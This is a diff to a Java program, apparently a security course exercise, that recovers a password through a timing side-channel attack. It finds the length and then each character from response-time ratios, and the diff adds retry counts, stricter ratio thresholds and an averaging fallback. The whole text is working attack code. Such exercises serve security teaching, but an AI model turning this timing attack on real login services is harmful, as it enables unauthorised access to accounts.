@@ -19,14 +19,17 @@ public class ex01_M2 {
     // Configuration
     public static int MIN_PASSWORD_LENGTH = 1;
     public static int MAX_PASSWORD_LENGTH = 32;
-    public static int CHECK_PASSWORD_LENGTH_ATTEMPTS = 1;
-    public static int CHECK_PASSWORD_CHARS_ATTEMPTS = 1;
+    public static int CHECK_PASSWORD_LENGTH_ATTEMPTS = 5;
+    public static int CHECK_PASSWORD_CHARS_ATTEMPTS = 5;
     public static int DEBUG_MESSAGE_COUNT = 1;
     public static boolean DEBUG_MESSAGE = true;
     public static int DIFFICULTY = 1;
     public static String USER_ID = "ID";
+
+    public static boolean DO_RATIO_CHECK = true;
     public static float MIN_RATIO = 1.05f;
     public static float MAX_RATIO = 150f;
+    public static float RATIO_DIFFERENCE_FIRST_TO_SECONDS = 0.15f;
 
     // Flags
     public static long FOUND_THE_PASSWORD = -1;
@@ -58,6 +61,9 @@ public class ex01_M2 {
 
             if("1".equals(body)){
                 System.out.println(url);
+                if(DEBUG_MESSAGE) {
+                    System.out.println(String.format("The %s return 1!", url));
+                }
                 return FOUND_THE_PASSWORD;
             }
 
@@ -230,12 +236,23 @@ public class ex01_M2 {
         return nBiggestRatio;
     }
 
+    public static String getMaxAverage(Map<String, PossiblePasswordData> results)
+    {
+        String max = results.keySet().iterator().next();
+        for (String password: results.keySet()) {
+            if(results.get(password).passwordResponseAverage > results.get(max).passwordResponseAverage) {
+                max = password;
+            }
+        }
+        return max;
+    }
+
     public static int checkPasswordLength() {
         List<String> possiblePasswords = new ArrayList<String>();
 
         for (int i = MIN_PASSWORD_LENGTH ; i <= MAX_PASSWORD_LENGTH ; i++)
         {
-            possiblePasswords.add(new String(new char[i]).replace("\0", "a"));
+            possiblePasswords.add(new String(new char[i]).replace("\0", "!"));
         }
 
         boolean foundLength = false;
@@ -255,15 +272,21 @@ public class ex01_M2 {
                 }
             }
 
-            List<TimingAttackResult> ratio = calculateNBiggestRatio(3, results);
-            length = ratio.get(0).password.length();
-            if (DEBUG_MESSAGE) {
-                System.out.println(String.format("Length %d bigger then other by %f times", length, ratio.get(0).ratio));
-                System.out.println(String.format("Length %d bigger then other by %f times", ratio.get(1).password.length(), ratio.get(1).ratio));
-                System.out.println(String.format("Length %d bigger then other by %f times", ratio.get(2).password.length(), ratio.get(2).ratio));
-            }
+            if (DO_RATIO_CHECK) {
+                List<TimingAttackResult> ratio = calculateNBiggestRatio(3, results);
+                length = ratio.get(0).password.length();
+                if (DEBUG_MESSAGE) {
+                    System.out.println(String.format("Length %d bigger then other by %f times", length, ratio.get(0).ratio));
+                    System.out.println(String.format("Length %d bigger then other by %f times", ratio.get(1).password.length(), ratio.get(1).ratio));
+                    System.out.println(String.format("Length %d bigger then other by %f times", ratio.get(2).password.length(), ratio.get(2).ratio));
+                }
 
-            if (ratio.get(0).ratio < MAX_RATIO && ratio.get(0).ratio > MIN_RATIO) {
+                if (ratio.get(0).ratio < MAX_RATIO && ratio.get(0).ratio > MIN_RATIO && (ratio.get(0).ratio - ratio.get(1).ratio) >= RATIO_DIFFERENCE_FIRST_TO_SECONDS) {
+                    foundLength = true;
+                }
+            }
+            else {
+                length = getMaxAverage(results).length();
                 foundLength = true;
             }
         }
@@ -284,7 +307,7 @@ public class ex01_M2 {
             for (char someChar: availablePasswordChar)
             {
                 String password = String.format("%s%c%s", charactersFoundFromPassword, someChar,
-                        new String(new char[passwordLength - currentPasswordIndex - 1]).replace("\0", "a"));
+                        new String(new char[passwordLength - currentPasswordIndex - 1]).replace("\0", "!"));
 
                 possiblePasswords.add(password);
             }
@@ -306,20 +329,27 @@ public class ex01_M2 {
                     }
                 }
 
-                List<TimingAttackResult> ratio = calculateNBiggestRatio(3, results);
-                nextChar = ratio.get(0).password.charAt(currentPasswordIndex);
+                if (DO_RATIO_CHECK) {
+                    List<TimingAttackResult> ratio = calculateNBiggestRatio(3, results);
+                    nextChar = ratio.get(0).password.charAt(currentPasswordIndex);
 
-                if (DEBUG_MESSAGE) {
-                    System.out.println(String.format("char %c bigger then other by %f times", ratio.get(0).password.charAt(currentPasswordIndex), ratio.get(0).ratio));
-                    System.out.println(String.format("char %c bigger then other by %f times", ratio.get(1).password.charAt(currentPasswordIndex), ratio.get(1).ratio));
-                    System.out.println(String.format("char %c bigger then other by %f times", ratio.get(2).password.charAt(currentPasswordIndex), ratio.get(2).ratio));
-                }
-                if (ratio.get(0).ratio < MAX_RATIO && ratio.get(0).ratio > MIN_RATIO) {
-                    foundNextChar = true;
-                    charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, nextChar);
                     if (DEBUG_MESSAGE) {
-                        System.out.println(String.format("Password until now is %s", charactersFoundFromPassword));
+                        System.out.println(String.format("char %c bigger then other by %f times", ratio.get(0).password.charAt(currentPasswordIndex), ratio.get(0).ratio));
+                        System.out.println(String.format("char %c bigger then other by %f times", ratio.get(1).password.charAt(currentPasswordIndex), ratio.get(1).ratio));
+                        System.out.println(String.format("char %c bigger then other by %f times", ratio.get(2).password.charAt(currentPasswordIndex), ratio.get(2).ratio));
                     }
+                    if (ratio.get(0).ratio < MAX_RATIO && ratio.get(0).ratio > MIN_RATIO && (ratio.get(0).ratio - ratio.get(1).ratio) >= RATIO_DIFFERENCE_FIRST_TO_SECONDS) {
+                        foundNextChar = true;
+                        charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, nextChar);
+                    }
+                }
+                else {
+                    nextChar = getMaxAverage(results).charAt(currentPasswordIndex);
+                    charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, nextChar);
+                    foundNextChar = true;
+                }
+                if (DEBUG_MESSAGE) {
+                    System.out.println(String.format("Password (length %d) until now is %s", passwordLength, charactersFoundFromPassword));
                 }
             }
         }
@@ -328,6 +358,7 @@ public class ex01_M2 {
     }
 
     public static void main(String[] args) {
+        long startTime = getCurrentTime();
         int passwordLength = checkPasswordLength();
         if(DEBUG_MESSAGE) {
             System.out.println(String.format("Password length is %d", passwordLength));
@@ -336,6 +367,7 @@ public class ex01_M2 {
         String password = checkThePassword(passwordLength);
         if(DEBUG_MESSAGE) {
             System.out.println(String.format("The password is %s", password));
+            System.out.println(String.format("took %d seconds", (getCurrentTime() - startTime) / (NANOSECONDS_IN_MILLISECONDS*1000)));
         }
 
         foundTheRightPassword(password);
